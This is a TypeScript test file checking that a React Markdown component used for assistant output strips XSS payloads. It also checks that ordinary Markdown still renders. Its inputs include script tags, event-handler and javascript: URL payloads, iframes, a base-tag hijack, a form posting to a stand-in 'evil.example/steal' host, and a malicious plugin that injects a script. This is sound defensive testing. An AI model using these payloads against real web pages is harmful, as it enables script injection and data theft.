import React from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { Markdown } from "./Markdown";

/**
 * Security regression test: the legacy Markdown renderer uses
 * react-markdown + rehype-raw, which parses raw HTML embedded in
 * assistant/model output. Without an HTML sanitizer, that raw HTML
 * reaches the DOM verbatim — a High-severity XSS sink (CWE-79).
 *
 * These tests render the REAL <Markdown> component (the same default
 * path as AssistantMessage) and assert that dangerous raw-HTML
 * payloads are stripped from the rendered output, while legitimate
 * Markdown/GFM features continue to render.
 *
 * The file is a `.ts` (not `.tsx`) test using React.createElement
 * because the vitest config only matches the `.ts` test glob in a node
 * environment. We render with react-dom/server so the assertions
 * exercise the actual production rendering pipeline.
 */

const h = React.createElement;

function render(
  content: string,
  rehypePlugins?: React.ComponentProps<typeof Markdown>["rehypePlugins"],
): string {
  return renderToStaticMarkup(
    h(Markdown, rehypePlugins ? { content, rehypePlugins } : { content }),
  );
}

describe("Markdown XSS sanitization", () => {
  describe("dangerous raw HTML is stripped", () => {
    it("strips <script> tags", () => {
      const html = render('Hello <script>alert("xss")</script> world');
      expect(html).not.toMatch(/<script/i);
      expect(html).not.toContain('alert("xss")');
    });

    it("strips <style> tags (CSS exfiltration / clickjacking)", () => {
      const html = render(
        "Hello <style>body { background: url('//evil') }</style> world",
      );
      // The <style> ELEMENT must not survive — that is the active sink.
      // rehype-sanitize drops the element but keeps its (now inert) text,
      // which is harmless escaped text, not a stylesheet.
      expect(html).not.toMatch(/<style/i);
      // The CSS payload must not survive as a functional stylesheet. Because
      // the <style> element is stripped, the url('//evil') declaration can
      // only appear (if at all) as inert escaped text, never inside a live
      // <style> block where it would fetch the resource.
      expect(html).not.toMatch(/<style[^>]*>[^<]*url\(/i);
    });

    it("strips <base href> (base-tag hijacking)", () => {
      const html = render('Hello <base href="https://evil.example/"> world');
      expect(html).not.toMatch(/<base/i);
      expect(html).not.toContain("evil.example");
    });

    it("strips <form action> and <button formaction>", () => {
      const html = render(
        'Hi <form action="https://evil.example/steal">' +
          '<button formaction="https://evil.example/steal">go</button>' +
          "</form>",
      );
      expect(html).not.toMatch(/<form/i);
      expect(html).not.toMatch(/formaction/i);
      expect(html).not.toContain("evil.example");
    });

    it("strips inline event handlers (onerror/onclick)", () => {
      const html = render(
        'Look <img src="x" onerror="alert(1)"> and ' +
          '<a href="#" onclick="alert(2)">link</a>',
      );
      expect(html).not.toMatch(/onerror/i);
      expect(html).not.toMatch(/onclick/i);
      expect(html).not.toContain("alert(1)");
      expect(html).not.toContain("alert(2)");
    });

    it("strips javascript: URLs from links", () => {
      // eslint-disable-next-line no-script-url
      const html = render("[click](javascript:alert(1))");
      expect(html).not.toContain("javascript:alert(1)");
      // The href must be neutralized — not merely the payload string absent.
      // A partially-broken sanitizer could drop the args but keep the scheme.
      expect(html).not.toMatch(/href="javascript:/i);
    });

    it("strips <iframe>", () => {
      const html = render(
        'Hi <iframe src="https://evil.example"></iframe> bye',
      );
      expect(html).not.toMatch(/<iframe/i);
      expect(html).not.toContain("evil.example");
    });

    it("sanitizes HTML injected by a consumer rehype plugin (sanitize must run last)", () => {
      // A malicious/compromised consumer-supplied rehype plugin injects a
      // raw <script> element directly into the HAST. rehype-sanitize must be
      // the TERMINAL rehype pass so that ANY node a consumer plugin adds is
      // still scrubbed. If consumer plugins run after sanitize, this payload
      // survives to output — a sanitizer bypass (CWE-79).
      const injectScript = () => (tree: any) => {
        tree.children.push({
          type: "element",
          tagName: "script",
          properties: {},
          children: [{ type: "text", value: 'alert("pwned")' }],
        });
      };
      const html = render("safe content", [injectScript]);
      expect(html).not.toMatch(/<script/i);
      expect(html).not.toContain('alert("pwned")');
    });
  });

  describe("legitimate markdown features are preserved", () => {
    it("renders headings, paragraphs, and links", () => {
      const html = render(
        "# Title\n\nSome **bold** [link](https://ok.example)",
      );
      expect(html).toMatch(/<h1[^>]*>/i);
      expect(html).toContain("Title");
      expect(html).toContain("https://ok.example");
      expect(html).toMatch(/<strong>bold<\/strong>/i);
    });

    it("preserves language-* className on code blocks (syntax highlighting)", () => {
      const html = render("```js\nconst x = 1;\n```");
      // The CodeBlock renderer is driven by the language-js className that
      // react-markdown derives from the fenced-code info string. Sanitize
      // must not strip the class attribute that selects the language, and
      // the highlighted code content must survive (the syntax highlighter
      // tokenizes it across spans, so assert on the tokens, not a verbatim
      // contiguous string).
      //
      // Assert language-js survives as an actual sanitized class ATTRIBUTE
      // (class="...language-js...") rather than as a bare substring that a
      // highlighter span or inline style could incidentally emit. This proves
      // rehype-sanitize kept the class attribute on the code element.
      expect(html).toMatch(/class="[^"]*\blanguage-js\b[^"]*"/);
      expect(html).toMatch(/const/);
      expect(html).toMatch(/x/);
      expect(html).toMatch(/1/);
    });

    it("renders GFM tables", () => {
      const md = ["| a | b |", "| - | - |", "| 1 | 2 |"].join("\n");
      const html = render(md);
      expect(html).toMatch(/<table/i);
      expect(html).toMatch(/<td[^>]*>1<\/td>/i);
    });

    it("renders GFM strikethrough", () => {
      const html = render("~~gone~~");
      expect(html).toMatch(/<del>gone<\/del>/i);
    });

    it("preserves the streaming cursor marker", () => {
      // The Markdown component renders a pulsing span for the ▍ cursor
      // emitted during streaming. Sanitization must not remove it.
      const html = render("partial answer `▍`");
      expect(html).toContain("▍");
    });
  });
});
